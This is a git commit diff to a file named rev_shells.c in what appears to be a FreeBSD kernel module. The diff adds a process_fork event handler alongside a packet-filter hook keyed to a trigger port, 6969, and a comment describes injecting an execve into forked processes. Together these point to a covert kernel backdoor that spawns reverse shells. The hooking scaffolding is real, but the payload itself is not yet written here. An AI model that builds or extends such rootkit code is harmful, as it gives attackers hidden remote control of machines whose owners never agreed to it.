4d552ef0a581029e208fdb68e7c9d9e2f2b5e21f
Baremetal MSI <spark61974@gmail.com>
2025-02-12 15:28:51 -0500

    attempting to register custom func for all fork calls

--- filter_hook/rev_shells.c
+++ filter_hook/rev_shells.c
@@ -18,32 +18,55 @@
 #include <netinet/ip_var.h>
 #include <net/if.h>
 #include <sys/syslog.h>
+#include <sys/eventhandler.h>
 
-
+// Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
+#define TRIGGER_PORT 6969
 // Define stack protection so we can use snprintf
-
 // Define the stack protector guard
 uintptr_t __stack_chk_guard = 0xDEADBEEFCAFEBABE;
-
 // Define the stack protection failure handler
 static void __stack_chk_fail(void) {
     panic("Kernel stack smashing detected!");
 }
 
+/*
+ * Start of hooking fork and shoving my big fat juicy execve in there
+*/
+// Custom func that will be invoked whenever do_fork() is invoked
+static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int flags) {
+    printf("Called custom hook when fork was invoked!!!\n");
+
+}
+
+// used to register our func to the kernel
+static eventhandler_tag my_fork_tag;
+
+// registers custom func to kernel
+// EVENTHANDLER_DIRECT_INVOKE(process_fork, p1, p2, fr->fr_flags);
+// The above line invokes process_fork and below we register to process_fork
+static void load_custom_fork_event_handler(void *arg) {
+    my_fork_tag = EVENTHANDLER_REGISTER(process_fork, my_fork_hook, NULL, EVENTHANDLER_PRI_ANY);
+    printf("[LKM] process_fork handler registered!\n");
+}
+
+// unregisters custom func to kernel
+static void unload_custom_fork_event_handler(void *arg) {
+    if (my_fork_tag != NULL)
+        EVENTHANDLER_DEREGISTER(process_fork, my_fork_tag);
+    printf("[LKM] process_fork handler unregistered!\n");
+}
 
 
 
-
-// Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
-#define TRIGGER_PORT 6969
 
 /*
+ * Start of custom packet filtering
  * Global variables to hold references to our head and hook.
  * We need these in order to unlink/unregister them during unload.
  */
 static pfil_head_t g_ph    = NULL;
 static pfil_hook_t g_hook  = NULL;
-
 
 // Helper function to see if the resource costly <m_pullup()> is needed for pakcet filtering
 static inline int m_pullup_needed(struct mbuf *m, int needed_len) {
